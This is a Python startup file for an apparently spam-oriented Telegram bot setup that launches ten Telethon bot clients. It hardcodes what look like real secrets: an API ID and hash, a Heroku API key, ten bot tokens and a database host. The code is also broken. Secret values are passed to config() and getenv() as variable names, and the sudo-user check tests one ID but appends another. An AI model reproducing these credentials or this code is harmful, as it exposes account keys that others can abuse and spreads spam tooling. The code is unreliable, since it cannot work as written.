
import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

deadlyversion = "v0.3.1"

#values
API_ID = config("21884763", default=None, cast=int)
API_HASH = config("da0f54c91d30d9d9a61a80df3a3c1637", default=None)
ALIVE_PIC = config("https://te.legra.ph/file/d5508122024fa2f6aadb9.jpg", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
OWNER_NAME = getenv("OWNER_NAME", default=None)
HEROKU_APP_NAME = config("spamrb", None)
HEROKU_API_KEY = config("c6d2706a-510c-407f-b6ce-d6adabf8b465", None)
BOT_TOKEN = config("6185268409:AAF4x1Tj2NGulVQwJEKtqbn9x86kpf1ZEmc", default=None)
BOT_TOKEN2 = config("6070918053:AAGqzigaXt5t6m_9Euqd1EUUzktkvrkr2P4", default=None)
BOT_TOKEN3 = config("5604597940:AAGn4A3fG9pg2U-witJZUVdqXyQG8GQJoJM", default=None)
BOT_TOKEN4 = config("6296332343:AAHJfoPC20A7vhDMyZuHye3tS79gdHL0Q7k", default=None)
BOT_TOKEN5 = config("5847030637:AAFZknDP-Oo8fQC6VTNCR6tdmWArGdAG1J4", default=None)
BOT_TOKEN6 = config("5803872864:AAHhTsiqAseVBr4k_xdx8Ebw54ou3NDCNtA", default=None)
BOT_TOKEN7 = config("6070918053:AAGqzigaXt5t6m_9Euqd1EUUzktkvrkr2P4", default=None)
BOT_TOKEN8 = config("6142882035:AAE4MfC6crcmEOTK7roqu6uQtkDFWMBY-2E", default=None)
BOT_TOKEN9 = config("6200722825:AAEJJppDCNIZ5ZKanTvJNTh94UnAou8xcrI", default=None)
BOT_TOKEN10 = config("6227242806:AAGIVA8Vz0x6RHI91sTTWAdISoM1FYGFMYU", default=None)
SUDO_USERS = list(map(int, getenv("5505885484 6156148673 6225220080").split()))
if 5256676062 not in SUDO_USERS:
    SUDO_USERS.append(5937170640)

OWNER_ID = int(os.environ.get("5477247654", None))

# Don't Mess with Codes !! 
DATABASE_URL = config("postgresql-111643-0.cloudclusters.net", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(5937170640)

# Tokens

BOT0 = TelegramClient('BOT0', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

BOT1 = TelegramClient('BOT1', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

BOT2 = TelegramClient('BOT2', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

BOT3 = TelegramClient('BOT3', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

BOT4 = TelegramClient('BOT4', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

BOT5 = TelegramClient('BOT5', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

BOT6 = TelegramClient('BOT6', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

BOT7 = TelegramClient('BOT7', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

BOT8 = TelegramClient('BOT8', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

BOT9 = TelegramClient('BOT9', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

print("[INFO] Successfully Started Bot Client Now Loading Plugins!") 
